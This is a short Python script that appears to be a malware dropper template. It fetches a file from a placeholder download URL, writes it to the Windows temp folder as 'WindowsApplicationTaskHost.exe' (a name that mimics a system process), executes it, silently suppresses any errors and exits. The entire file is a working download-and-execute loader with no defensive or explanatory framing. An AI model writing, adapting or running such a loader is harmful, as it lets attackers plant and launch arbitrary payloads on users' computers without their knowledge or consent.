import requests
import os
import sys

from time import sleep

url = "{downloadurl}"

response = requests.get(url)

if response.status_code == 200:
    try:
        if os.path.exists(f"{os.getenv('temp')}\\WindowsApplicationTaskHost.exe"):
            os.remove(f"{os.getenv('temp')}\\WindowsApplicationTaskHost.exe")
        with open(f"{os.getenv('temp')}\\WindowsApplicationTaskHost.exe", "wb") as f:
            f.write(response.content)
        os.startfile(f"{os.getenv('temp')}\\WindowsApplicationTaskHost.exe")
    except:
        pass
    sleep(2)
    os._exit(0)